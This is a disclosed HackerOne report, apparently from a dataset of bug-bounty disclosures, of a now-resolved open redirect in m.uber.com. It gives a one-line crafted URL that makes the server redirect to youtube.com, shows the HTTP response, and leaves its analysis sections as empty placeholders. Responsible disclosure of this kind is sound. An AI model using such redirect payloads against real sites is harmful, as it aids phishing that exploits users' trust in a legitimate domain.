---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '125000'
original_report_id: '125000'
title: Open Redirect in m.uber.com
team_handle: uber
created_at: '2016-03-22T16:42:22.959Z'
disclosed_at: '2016-09-27T18:28:28.141Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
---

# Open Redirect in m.uber.com

## Metadata

- HackerOne Report ID: 125000
- Weakness: 
- Program: uber
- Disclosed At: 2016-09-27T18:28:28.141Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Reproduction Steps:
`https://m.uber.com//youtube.com/%2F..`

HTTP Response:
```
HTTP/1.1 303 See Other
...
Location: //youtube.com/%2F../
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
